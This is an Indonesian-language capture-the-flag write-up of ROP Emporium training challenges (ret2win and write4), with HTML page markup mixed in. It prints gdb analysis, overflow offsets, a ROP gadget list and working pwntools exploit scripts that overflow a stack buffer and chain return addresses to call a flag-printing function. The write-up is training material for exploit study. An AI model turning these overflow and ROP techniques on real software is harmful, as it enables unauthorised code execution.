0x0000000000400629 : mov dword ptr [rsi], edi ; ret 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret 0x0000000000400628 : mov qword ptr [r14], r15 ; ret 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400690 : pop r14 ; pop r15 ; ret 0x0000000000400692 : pop r15 ; ret 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400588 : pop rbp ; ret 0x0000000000400693 : pop rdi ; ret 0x0000000000400691 : pop rsi ; pop r15 ; ret 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004e6 : ret Unique gadgets found: 15   Saya memakai 0x0000000000400690 untuk pop 14 pop 15 dan 0x0000000000400693 untuk pop rdi.\nKita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  from pwn import * p = ELF('./write4') r = process('./write4') gadgets = p.symbols['usefulGadgets'] printFlag = p.symbols['print_file'] bss = 0x000000000601038 pop_r14_r15 = 0x0000000000400690 pop_rdi = 0x0000000000400693 log.info('print_flag 0x%x' %printFlag) log.info('gadgets 0x%x' %gadgets) log.info('pop rdi 0x%x' %pop_rdi) log.info('mov r14 r15 0x%x' %gadgets) log.info('pop r14 r15 0x%x' %pop_r14_r15) log.info('bss 0x%x' %bss) junk = b'X'*40 payload = junk payload += p64(pop_r14_r15) payload += p64(bss) payload += b'flag.txt' payload += p64(gadgets) payload += p64(pop_rdi) payload += p64(bss) payload += p64(printFlag) r.sendline(payload) r.interactive()   Jalankan maka didapatkan flag\n1 2 3 4 5 6  $python3 sol.py  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 13422) [*] Got EOF while reading in interactive $   [Created at: February 19, 2021]\n","wordCount":"4252","inLanguage":"en","datePublished":"2021-02-10T22:29:10+07:00","dateModified":"2021-02-10T22:29:10+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahm4ddm.xyz/posts/ctf/writeup-ropemporium/"},"publisher":{"@type":"Organization","name":"~/.ahm4ddm","logo":{"@type":"ImageObject","url":"https://ahm4ddm.xyz/favicon.ico"}}}</script></head><body class=dark id=top><script>if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}</script><header class=header><nav class=nav><div class=logo><a href=https://ahm4ddm.xyz accesskey=h title="~/.ahm4ddm (Alt + H)"><img src=https://ahm4ddm.xyz/home.png alt aria-label=logo height=30>~/.ahm4ddm</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ahm4ddm.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://ahm4ddm.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://ahm4ddm.xyz/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>ROP Emporium</h1><div class=post-description>Writeup ROP Emporium x86 dan x86_64(Indonesia)</div><div class=post-meta><span title="2021-02-10 22:29:10 +0700 WIB">February 10, 2021</span></div></header><div class=post-content><h1 id=daftar-isi>Daftar Isi<a hidden class=anchor aria-hidden=true href=#daftar-isi>#</a></h1><p><a href=#ret2win>ret2win</a><br><a href=#split>split</a><br><a href=#callme>callme</a><br><a href=#write4>write4</a></p><h1 id=ret2win>ret2win<a hidden class=anchor aria-hidden=true href=#ret2win>#</a></h1><table><thead><tr><th>File</th><th>Download</th></tr></thead><tbody><tr><td><a href=#ret2win32>ret2win32</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/ret2win32/ret2win32>klik</a></td></tr><tr><td><a href=#ret2win64>ret2win64</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/ret2win/ret2win>klik</a></td></tr></tbody></table><h3 id=ret2win32>ret2win32<a hidden class=anchor aria-hidden=true href=#ret2win32>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop)</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec ret2win32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre></td></tr></table></div></div><p>kita cek dengan gdb, saya mencoba dengan menampilkan semua fungsi yang ada pada binary</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
</code></pre></td></tr></table></div></div><p>kita coba disassembly fungsi <em><strong>main</strong></em>.<br>pada fungsi main binary memanggil fungsi yaitu <em><strong>pwnme</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas main
Dump of assembler code for function main:
   ...
   ...
   ...
   0x08048583 &lt;+61&gt;:	call   0x80483d0 &lt;puts@plt&gt;
   0x08048588 &lt;+66&gt;:	add    esp,0x10
   0x0804858b &lt;+69&gt;:	call   0x80485ad &lt;pwnme&gt;
   ...
   ...
   ...
End of assembler dump.

</code></pre></td></tr></table></div></div><p>kita disassembly fungsi <em><strong>pwnme</strong></em> ternyata ada kerentanan fungsi <em><strong>read</strong></em> dimana tidak ada Null Byte pada saat input berakhir.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x0804860e &lt;+97&gt;:	push   eax
   0x0804860f &lt;+98&gt;:	push   0x0
   0x08048611 &lt;+100&gt;:	call   0x80483b0 &lt;read@plt&gt;
   0x08048616 &lt;+105&gt;:	add    esp,0x10
   0x08048619 &lt;+108&gt;:	sub    esp,0xc
...
...
...
</code></pre></td></tr></table></div></div><p>Tidak ada pemanggilan fungsi <em><strong>ret2win</strong></em> pada binary.<br>kita cek disassembly fungsi <em><strong>ret2win</strong></em>
ternyata ada pemanggilan <em><strong>system</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas ret2win
Dump of assembler code for function ret2win:
...
...
...
   0x08048645 &lt;+25&gt;:	push   0x8048813
   0x0804864a &lt;+30&gt;:	call   0x80483e0 &lt;system@plt&gt;
...
...
...
</code></pre></td></tr></table></div></div><p>saya beranggapan bahwa itu memanggil <em><strong>system(cat flag.txt)</strong></em> dan ternyata benar</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>0x8048813:	&#34;/bin/cat flag.txt&#34;
</code></pre></td></tr></table></div></div><p>Kita buat exploit code.<br>Pertama harus tau offset ke EIP.<br>didapatkan 44.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~8
Pattern buffer found at:
0xffffd0c0 : offset    0 - size   56 ($sp + -0x30 [-12 dwords])
References to pattern buffer found at:
0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])
</code></pre></td></tr></table></div></div><p>kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *
p = ELF(&#39;./ret2win32&#39;)
r = process(&#39;./ret2win32&#39;)

ret2win = p.symbols[&#39;ret2win&#39;]
junk = b&#39;X&#39;*44
junk += p32(ret2win)
log.info(&#39;ret2win 0x%x&#39; %ret2win)
r.sendline(junk)
r.interactive()
</code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 solver.py
...
...
...
&gt; Thank you!
Well done! Here&#39;s your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
</code></pre></td></tr></table></div></div><h3 id=ret2win64>ret2win64<a hidden class=anchor aria-hidden=true href=#ret2win64>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop)</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></td></tr></table></div></div><p>Setelah dilakukan pengecekan pada gdb sama seperti binary 32 bit<br>Kita cari offset. didapatkan 40<br>Mungkin disini timbul pertanyaan, kenapa RIP tidak ter-overwrite?
karena aplikasi yang berjalan pada arsitektur 64-bit hanya me-load canonical address ke dalam register <em><strong>RIP</strong></em><br>Contoh: Ketika overflow sebuah buffer dengan pattern yang kita buat dan ingin melihat <em><strong>RIP</strong></em> tertimpa dengan alamat pattern seharusnya tidak bisa karena itu bukan canonical address. lebih lanjut kunjungi <a href=https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details>ini</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~35
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   56 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
</code></pre></td></tr></table></div></div><p>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./ret2win&#39;)
r = process(&#39;./ret2win&#39;)

ret2win = p.symbols[&#39;ret2win&#39;]
junk = b&#39;X&#39;*40
junk += p64(ret2win)
log.info(&#39;ret2win 0x%x&#39; %ret2win)
r.sendline(junk)
r.interactive()
</code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
...
...
...
&gt; Thank you!
Well done! Here&#39;s your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
